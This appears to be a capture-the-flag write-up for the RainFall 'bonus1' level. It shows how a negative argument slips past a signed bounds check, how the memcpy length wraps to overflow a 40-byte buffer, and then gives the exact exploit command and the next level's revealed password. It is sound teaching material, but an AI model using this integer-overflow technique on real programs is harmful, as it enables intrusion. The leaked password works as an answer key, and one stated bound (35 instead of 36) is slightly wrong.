1. Check the protections:

In the source code, we can see this code:
```c
char str[40];
int arg1 = atoi(argv[1]);

if (arg1 > 9) return 1;

memcpy(str, argv[2], (arg1 * 4));
```

We can see that the protection of `arg1` don't let us have more than `9` as value,
and with that protection, the `memcpy` cannot go above `35`. So, we cannot have any buffer overflow

2. Bypass protection

Except if the developer used an `int` and forgot to check the negative number.

With that case, we can create an `int` overflow, and have a very large positive number.

For example, if we want to write 64 bytes, we know that on each turn, we want 16 more bytes.

Then, we simply need to send: INT_MIN + 16.

The result will be for example:
1. (-2147483648 + 16) * 1 = -2147483632
2. (INT_MIN + 16) * 2 = 2 * 16 + 2 * (INT_MIN) = 2 * 16 + 0 = 32
3. (INT_MIN + 16) * 3 = 2 * INT_MIN + 32 + INT_MIN = 32 + 16 + INT_MIN = 48 + INT_MIN
4. (INT_MIN + 16) * 4 = 2 * 2 * INT_MIN + 48 + 16 = 64.

With that example you can see that we can simply forge any number we want with the overflow.

3. Write `0x574f4c46` in `arg1`

Okay, so to write the correct value in `arg1`, we need to overflow the `40` bytes, and write `4` bytes more.

It means that we need to write `44` bytes, so `11` bytes on each turn.

Then it means that arg1 should be equals to `-2147483637`

And we need to write after that `\x57\x4f\x4c\x46`

4. Payload

```sh
bonus1@RainFall:~$ ./bonus1 -2147483637 "$(python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"')"
$ cd ../bonus2
$ cat .pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```